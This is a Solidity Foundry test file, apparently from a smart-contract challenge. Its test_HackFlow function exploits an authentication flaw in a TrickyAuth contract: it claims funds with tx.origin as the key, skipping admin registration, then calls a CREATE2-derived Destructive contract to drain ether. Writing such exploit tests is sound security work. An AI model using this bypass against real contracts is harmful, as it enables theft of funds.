// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TrickyAuth, Destructive} from "../src/TrickyAuth.sol";

contract CounterTest is Test {
    TrickyAuth  public CT;
    uint256 constant CT_BALANCE = 0x1000000000000000;
    address admin = address(0x12);

    function setUp() public {
        payable(admin).transfer(CT_BALANCE);

        vm.prank(admin);
        CT = new TrickyAuth{value: CT_BALANCE}();
    }

    function destructive() internal view returns (Destructive addr) {
        bytes32 codehash = keccak256(abi.encodePacked(type(Destructive).creationCode));
        address deployer = address(CT);
        bytes32 salt = bytes20(tx.origin);

        assembly {
            let ptr := mload(0x40)

            mstore(add(ptr, 0x40), codehash)
            mstore(add(ptr, 0x20), salt)
            mstore(ptr, deployer)

            let start := add(ptr, 0x0b)
            mstore8(start, 0xff)
            addr := keccak256(start, 85)
        }
    }

    function test_HackFlow() public {
        uint256 pre = tx.origin.balance;

        CT.proposeKey(bytes32(uint256(1)));
        CT.claim(bytes32(uint256(uint160(tx.origin))));
        destructive().claim();

        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
    }

    function test_NormalFlow() public {
        bytes32 key = bytes32(uint256(0x17));
        uint256 pre = tx.origin.balance;

        CT.proposeKey(key);

        vm.prank(admin);
        CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), key)));

        CT.claim(key);
        destructive().claim();

        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
    }
}
